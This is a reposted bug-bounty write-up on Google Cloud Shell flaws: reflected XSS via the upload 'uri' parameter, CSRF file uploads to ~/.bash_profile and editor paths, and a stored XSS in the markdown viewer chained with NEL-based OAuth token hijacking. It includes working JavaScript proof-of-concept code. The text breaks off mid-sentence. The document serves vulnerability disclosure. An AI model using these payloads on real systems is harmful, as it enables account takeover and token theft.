---
title: [ GCP 2022 ] Few bugs in the google cloud shell
url: https://buaq.net/go-170226.html
source: unSafe.sh - 不安全
date: 2023-06-26
fetch_date: 2025-10-04T11:44:50.953310
---

# [ GCP 2022 ] Few bugs in the google cloud shell

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/fcf24cf7eb6e459179079ecee03a9ecd.jpg)

[ GCP 2022 ] Few bugs in the google cloud shell

What is Google Cloud Shell.    Cloud Shell is an interactive shell environment for Google Cloud tha
*2023-6-25 19:10:10
Author: [govuln.com(查看原文)](/jump-170226.htm)
阅读量:69
收藏*

---

### What is Google Cloud Shell.

    Cloud Shell is an interactive shell environment for Google Cloud that lets you learn and experiment with Google Cloud and manage your projects and resources from your web browser.

### 1. XSS via `uri` parameter in file uploading feature

**Endpoint:** *POST https://970-cs-<ID>-default.cs-europe-west4-fycr.cloudshell.dev/file-upload*

**Issue**: *214291117*

### Description:

    When a file uploaded the server return the unescaped `uri` parameter value in the response body. But this response has '*text/html*' value in the content-type header, so this response will be interpreted as a usual html document by browser if user will see it (see screenshot/video). Attacker can load file from his own origin via form and user will see that response.

#### Code (javascript):

> function send(devshell\_host, target='\_blank') {

> > if(!devshell\_host) return alert('Devshell host is empty')
>
> > let form = document.createElement('form');
>
> > form.action = `https://${devshell\_host}/file-upload?`
>
> > form.target = target
>
> > form.method = 'POST'
>
> > form.enctype = 'multipart/form-data'
>
> > /\* ADD PAYLOAD TO PATH \*/
>
> > let uriInput = document.createElement('input')
>
> > uriInput.name = 'uri'
>
> > uriInput.value = `/tmp/test<img/src/onerror=alert(document.domain);${Math.floor(Math.random() \* 1000) }>`
>
> > /\* ADD UPLOAD FILE \*/
>
> > let fileInput = document.createElement('input')
>
> > fileInput.type = 'file'
>
> > fileInput.name = 'file'
>
> > let file = new File(['somecontent'], "img.jpg",{type:"image/jpeg", lastModified:new Date().getTime()});
>
> > let container = new DataTransfer();
>
> > container.items.add(file);
>
> > fileInput.files = container.files;
>
> > /\* BUILD FORM \*/
>
> > form.replaceChildren(uriInput, fileInput)
>
> > document.body.append(form)
>
> > /\* SEND \*/
>
> > form.submit()

> }

> send('your-domain')

#### Screenshot:

[![XSS cloud shell](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCGnFx2x9XwByebnlewnbicGvWAqaNG2ZeYtLID9JKM9PA4m6br5pP7FTZ7lUTn5R9gVIU-kNtTyVMmFYRDE5NatpmfUxwFkg9SHWcWhj7Scz7QO_xvEr3AGLF0YJHLFd1-NM51dsfQgQl_FRaGGCdpnE5MNsp9MQuRBcxz33nNyiG3Rd5mjN4WddKWQ/w320-h160/DEVSHELL_XSS_FILE_UPLOAD.png "Screenshot")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCGnFx2x9XwByebnlewnbicGvWAqaNG2ZeYtLID9JKM9PA4m6br5pP7FTZ7lUTn5R9gVIU-kNtTyVMmFYRDE5NatpmfUxwFkg9SHWcWhj7Scz7QO_xvEr3AGLF0YJHLFd1-NM51dsfQgQl_FRaGGCdpnE5MNsp9MQuRBcxz33nNyiG3Rd5mjN4WddKWQ/s1919/DEVSHELL_XSS_FILE_UPLOAD.png)

#### Video:

### 2. CSRF File uploading

**Endpoints**:

* *POST https://970-cs-<ID>-default.cs-europe-west4-fycr.cloudshell.dev/\_cloudshell/file?path=...*
* *POST https://970-cs-<ID>-default.cs-europe-west4-fycr.cloudshell.dev/file-upload*

**Issue:** *214035061*

**Bounty:** *5k + 5k (another endpoint and re-attack after fix)*

#### Description:

    User can upload files to his cloud shell via two endpoints:

* POST https://8080-cs-<ID>-default.cs-europe-west4-fycr.cloudshell.dev/\_cloudshell/file?path=<DIRECTORY>
* POST https://970-cs-<ID>-default.cs-europe-west4-fycr.cloudshell.dev/file-upload

    Both of them were vulnerable to CSRF and had no any protection of csrf. It makes possible to send POST request with file from any third-party origin (attacker's origin) to the user's vm origin (victim origin). If some file will be uploaded to `~/.bash\_profile` path (for example) this file will be stored for a long time and will be executed every time when user login in his vm.

    Also this csrf can be used for xss if attacker will upload a file with payload to the "/google/devshell/editor/theia/lib/" path.

#### Example of code:

>     function uploadBashPayload(hostname){
>          let formData = new FormData()
>          let file = new Blob(['some evil content'], {type : 'text/plain'});
>          formData.append('uploadFile', file, '<your-filepath>')
>          fetch(`https://${hostname}/\_cloudshell/file?path=`, { credentials: 'include', method: 'POST', body: formData } )
>      }

#### Example of code 2:

> function uploadXSSPayload(hostname){
>      let winname = 'evilwindow'
>      let win = window.open('about:blank', winname)
>      let filename = `test${Math.floor(Math.random() \* 1000) }.html`
>      if(!hostname) return alert('Devshell host is empty')
>      let form = document.createElement('form');
>      form.action = `https://${hostname}/file-upload?`
>      form.target = winname
>      form.method = 'POST'
>      form.enctype = 'multipart/form-data'
>      /\* ADD PAYLOAD IN PATH \*/
>      let uriInput = document.createElement('input')
>      uriInput.name = 'uri'
>      uriInput.value = `/google/devshell/editor/theia/lib/${filename}`
>      /\* ADD UPLOAD FILE \*/
>      let fileInput = document.createElement('input')
>      fileInput.type = 'file'
>      fileInput.name = 'file'
>      let file = new File(['<html><head><script>alert(`I am xss in: \$\{ origin \} origin`)</script></head><body>Hey! Iam attacker page</body></html>'], filename,{type:"image/jpeg", lastModified:new Date().getTime()});
>      let container = new DataTransfer();
>      container.items.add(file);
>      fileInput.files = container.files;
>      /\* BUILD FORM \*/
>      form.replaceChildren(uriInput, fileInput)
>      document.body.append(form)
>      /\* SEND \*/
>      form.submit()
>      setTimeout( ()=>{ win.location = `https://${hostname}/${filename}` }, 1500)
>  }

#### Video:

### 3. Stored XSS in Markdown Viewer and oauth token hijacking

**Issue:** 217090716
 **Bounty:** 5K

#### XSS via markdown part

1. When a markdown document is opened in /webview the child frame with the rendered markdown document has CSP for prevent javascript execution, but it allows to redirect the current frame to any other origin via `<meta http-equiv="refresh" content="0;url=//evil-url">` tag.
2. The `/webview/index.html` frame listens messages from child frame and doesn't check origin of message. So the attacker's iframe can can send commands to the parent frame.
3. In the `/webview/main.js` the function `getVsCodeApiScript` generates inline javascript for child frame and use the unsafe 'state' param inside script content, this param can be received from any child frame via `postMessage()`. It doesnt sanitizing the state param and it used in the script tag content. If the state param contains string '</script><script>evil' - browser will parse it as two different <script> nodes and will add them to the head of page ( before the csp meta tags will be added).
4. So attacker can place any javascript inside the state param and send it to the parent frame via `parent.parent.postMessage()`.

#### Token hijacking with NEL

1. If attacker can get control of victim VM (through xss, csrf, etc) he can run his own webserver instead of original devshell server and configure it to send NEL reports to the attacker's report-uri.
2. Browser will store attacker's *'report-uri'* endpoint to use it for sending all network error reports what will thrown in user's devshell origin.
3. Every time, when user starts new devshell session, browser sends many authorization requests to the VM origin with oauth token in url. Because the devshell not started yet server responds with 503 http code. It's the network error, so browser will send a report.
4. Browser will ...